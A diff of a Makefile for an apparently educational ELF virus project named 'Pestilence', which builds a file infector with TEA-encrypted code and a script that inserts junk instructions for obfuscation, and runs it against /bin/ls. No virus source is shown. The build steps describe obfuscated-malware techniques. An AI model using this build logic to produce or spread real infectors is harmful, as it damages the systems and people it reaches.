@@ -1,6 +1,6 @@
 NAME = Pestilence
 
-FLAGS = -MD -fno-stack-protector -fPIC -fPIE 
+FLAGS = -MD -fno-stack-protector -fPIC -fPIE
 
 SRC_DIR				= .
 TMP_DIR				= .tmp
@@ -30,7 +30,7 @@ SRC_S = virus/start.s lib/crypto/tea_decrypt.s
 OBJ	=	$(addprefix $(OBJ_DIR)/, $(SRC_C:.c=.o)) \
 		$(addprefix $(OBJ_DIR)/, $(SRC_S:.s=.o)) \
 
-SRC_INF_C = infector/main.c $(FTLIB) $(INFECT) $(FORMATS)
+SRC_INF_C = infector/main.c $(FTLIB) $(INFECT) $(FORMATS) $(CRYPTO)
 
 OBJ_INF	= $(addprefix $(OBJ_DIR)/, $(SRC_INF_C:.c=.o))
 
@@ -56,7 +56,7 @@ $(VIRUS_X): $(VIRUS)
 
 $(VIRUS): $(OBJ) $(LD_RULES)
 	ld -o $@ -T $(LD_RULES) $(OBJ)
-	nm -n .tmp/virus.template | grep ' B \| b ' | diff - /dev/null || rm $(VIRUS)
+	#nm -n .tmp/virus.template | grep ' B \| b ' | diff - /dev/null || rm $(VIRUS)
 
 $(TMP_DIR):
 	mkdir -p $@
@@ -75,26 +75,21 @@ GARBAGE_CF = $(TMP_DIR)/garbage.txt
 $(GARBAGE_CF): $(TMP_DIR)
 	echo "0" > $@
 
-$(TMP_DIR)/virus.s.g.s: $(TMP_DIR)/virus.s $(GARBAGE_CF)
-	#cp $< $@
-	# nm --defined-only .tmp/obj/virus.o | grep -v '\.' | grep -i ' t ' | cut -d ' ' -f 3
+$(OBJ_DIR)/virus/main.s.g.s: $(OBJ_DIR)/virus/main.s $(GARBAGE_CF)
 	./others/scripts/add_garbage $< -cf $(GARBAGE_CF) -p 200 -l decrypt do_infection entry virus
-	#./scripts/add_garbage $< -p 200 -l .ALL
-
-$(TMP_DIR)/lib/lib.s.g.s: $(TMP_DIR)/lib/lib.s $(GARBAGE_CF)
-	#cp $< $@
-	./others/scripts/add_garbage $< -cf $(GARBAGE_CF) -p 200 -l ft_open
-	#./scripts/add_garbage $< -cf $(GARBAGE_CF) -p 200 -l add_base call close contains d_isdir d_isfile execve exit ffree fget fork fput free getdents getenv getpid lseek malloc _malloc malloc_shared open print println printnb printnbln ptrace read restore_rt scmp signal slen snbr sncmp startswith str_equal waitpid write xstat
 
 $(TABLE_C): $(GARBAGE_CF)
 	./others/scripts/gen_garbage_table -n `cat $(GARBAGE_CF)` -o $@
 
+$(OBJ_DIR)/%.o: $(OBJ_DIR)/%.s.g.s | $(OBJ_DIR)
+	gcc $(FLAGS) $(LIBFLAGS) -c $< -o $@
+
+$(OBJ_DIR)/%.s: $(SRC_DIR)/%.c | $(OBJ_DIR) $(TMP_LIB_DIR)
+	gcc $(FLAGS) $(LIBFLAGS) -S $< -o $@
+
 ##
 ## END
 ##
-
-$(OBJ_DIR)/%.o: $(TMP_DIR)/%.s.g.s | $(OBJ_DIR)
-	gcc $(FLAGS) $(LIBFLAGS) -c $< -o $(OBJ_DIR)/$(notdir $@)
 
 $(OBJ_DIR)/%.o: %.c | $(OBJ_DIR)
 	gcc $(FLAGS) $(LIBFLAGS) -c $< -o $@
@@ -121,7 +116,7 @@ re: fclean
 .PHONY: all re clean fclean test unit_test
 
 test: all
-	(cd test && ./run.sh)
+	(cd others/test && ./run.sh)
 
 ls: all
 	./$(NAME) /bin/ls
